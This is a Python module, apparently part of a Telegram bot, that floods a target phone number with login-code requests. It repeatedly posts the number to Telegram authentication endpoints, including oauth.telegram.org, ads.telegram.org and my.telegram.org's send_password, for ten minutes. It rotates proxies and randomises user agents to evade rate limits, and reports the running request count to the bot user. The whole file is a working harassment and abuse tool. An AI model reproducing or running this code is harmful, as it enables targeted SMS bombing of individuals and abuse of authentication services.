import asyncio
import random
import requests
from fake_useragent import UserAgent
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from config import WORKING_PROXIES_FILE
from emojis import Emojis
import config

def load_working_proxies():
    """Загрузка рабочих прокси из файла"""
    try:
        with open(WORKING_PROXIES_FILE, 'r', encoding='utf-8') as f:
            proxies = [
                line.strip() for line in f 
                if line.strip() and not line.startswith('#')
            ]
        return proxies
    except FileNotFoundError:
        return []

def get_random_proxy(working_proxies):
    """Возвращает случайный рабочий прокси"""
    if not working_proxies:
        return None
    
    proxy = random.choice(working_proxies)
    return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}

def create_session_with_retries():
    """Создает сессию с повторными попытками"""
    session = requests.Session()
    retries = Retry(
        total=1,
        backoff_factor=0.3,
        status_forcelist=[500, 502, 503, 504]
    )
    session.mount('http://', HTTPAdapter(max_retries=retries))
    session.mount('https://', HTTPAdapter(max_retries=retries))
    return session

async def send_fragment(phone, proxy):
    ua = UserAgent()
    url = "https://oauth.telegram.org/auth/request"
    
    headers = {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://oauth.telegram.org',
        'referer': 'https://oauth.telegram.org/auth',
        'user-agent': ua.random,
    }
    
    data = {
        'phone': phone,
        'bot_id': '5444323279',
        'origin': 'https://fragment.com',
        'request_access': 'write',
        'return_to': 'https://fragment.com/'
    }
    
    session = create_session_with_retries()
    
    try:
        if proxy and config.USE_PROXY:
            response = session.post(url, headers=headers, data=data, proxies=proxy, timeout=8)
        else:
            response = session.post(url, headers=headers, data=data, timeout=8)
        
        return response.status_code in [200, 302]
    except:
        return False

async def send_telegram_ads(phone, proxy):
    url = 'https://ads.telegram.org/auth/'
    
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://my.telegram.org',
        'referer': 'https://my.telegram.org/auth',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    }
    
    data = {'phone': phone}
    session = create_session_with_retries()
    
    try:
        if proxy and config.USE_PROXY:
            response = session.post(url, headers=headers, data=data, proxies=proxy, timeout=8)
        else:
            response = session.post(url, headers=headers, data=data, timeout=8)
        
        return response.status_code in [200, 302]
    except:
        return False

async def send_my_telegram_org(phone, proxy):
    ua = UserAgent()
    url = 'https://my.telegram.org/auth/send_password'
    
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://my.telegram.org',
        'referer': 'https://my.telegram.org/auth',
        'user-agent': ua.random,
    }
    
    data = {'phone': phone}
    session = create_session_with_retries()
    
    try:
        if proxy and config.USE_PROXY:
            response = session.post(url, headers=headers, data=data, proxies=proxy, timeout=8)
        else:
            response = session.post(url, headers=headers, data=data, timeout=8)
        
        return response.status_code in [200, 302]
    except:
        return False

async def send_kupikod(phone, proxy):
    ua = UserAgent()
    url = "https://oauth.telegram.org/auth/request"
    
    headers = {
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://oauth.telegram.org',
        'referer': 'https://oauth.telegram.org/auth',
        'user-agent': ua.random,
    }
    
    data = {
        'phone': phone,
        'bot_id': '5731754199',
        'origin': 'https://steam.kupikod.com',
        'request_access': 'write',
        'return_to': 'https://fragment.com/'
    }
    
    session = create_session_with_retries()
    
    try:
        if proxy and config.USE_PROXY:
            response = session.post(url, headers=headers, data=data, proxies=proxy, timeout=8)
        else:
            response = session.post(url, headers=headers, data=data, timeout=8)
        
        return response.status_code in [200, 302]
    except:
        return False

# Список функций для флуда
flood_functions = [
    send_fragment,
    send_telegram_ads,
    send_my_telegram_org,
    send_kupikod
]

async def flood_worker(phone, message, bot, user_id, duration=600, flood_active=None):
    """Основная функция для выполнения флуда с возможностью остановки"""
    working_proxies = load_working_proxies()
    
    start_time = asyncio.get_event_loop().time()
    total_requests = 0
    
    status_message = await message.answer(
        f"{Emojis.FLOOD} <b>Флуд активен</b>\n\n"
        f"{Emojis.PHONE} <b>Номер:</b> <code>{phone}</code>\n"
        f"{Emojis.COUNT} <b>Отправлено запросов:</b> {total_requests}",
        parse_mode="HTML"
    )
    
    last_status_time = start_time
    
    while (asyncio.get_event_loop().time() - start_time) < duration:
        # Проверяем, не остановлен ли флуд
        if user_id in flood_active and not flood_active[user_id]:
            break
        
        for func in flood_functions:
            # Проверяем остановку перед каждым запросом
            if user_id in flood_active and not flood_active[user_id]:
                break
            
            if (asyncio.get_event_loop().time() - start_time) >= duration:
                break
            
            if config.USE_PROXY and working_proxies:
                proxy = get_random_proxy(working_proxies)
            else:
                proxy = None
            
            await func(phone, proxy)
            total_requests += 1
            
            # Обновляем статус каждые 3 секунды
            current_time = asyncio.get_event_loop().time()
            if current_time - last_status_time >= 3:
                time_left = int(duration - (current_time - start_time))
                minutes_left = time_left // 60
                seconds_left = time_left % 60
                
                # Проверяем остановку перед обновлением статуса
                if user_id in flood_active and not flood_active[user_id]:
                    break
                
                try:
                    await status_message.edit_text(
                        f"{Emojis.FLOOD} <b>Флуд активен</b>\n\n"
                        f"{Emojis.PHONE} <b>Номер:</b> <code>{phone}</code>\n"
                        f"{Emojis.TIME} <b>Осталось:</b> {minutes_left:02d}:{seconds_left:02d}\n"
                        f"{Emojis.COUNT} <b>Отправлено запросов:</b> {total_requests}",
                        parse_mode="HTML"
                    )
                    last_status_time = current_time
                except:
                    pass
            
            await asyncio.sleep(0.2)
    
    # Удаляем статусное сообщение
    try:
        await status_message.delete()
    except:
        pass
    
    # Проверяем, был ли флуд остановлен досрочно
    if user_id in flood_active and not flood_active[user_id]:
        await message.answer(
            f"{Emojis.STOP} <b>Флуд остановлен досрочно!</b>\n\n"
            f"{Emojis.PHONE} <b>Номер:</b> <code>{phone}</code>\n"
            f"{Emojis.COUNT} <b>Отправлено запросов:</b> {total_requests}",
            parse_mode="HTML"
        )
    else:
        await message.answer(
            f"{Emojis.SUCCESS} <b>Флуд завершен!</b>\n\n"
            f"{Emojis.PHONE} <b>Номер:</b> <code>{phone}</code>\n"
            f"{Emojis.COUNT} <b>Всего отправлено запросов:</b> {total_requests}\n"
            f"{Emojis.TIME} <b>Длительность:</b> 10 минут",
            parse_mode="HTML"
        )
    
    # Очищаем флаг активности
    if user_id in flood_active:
        del flood_active[user_id]
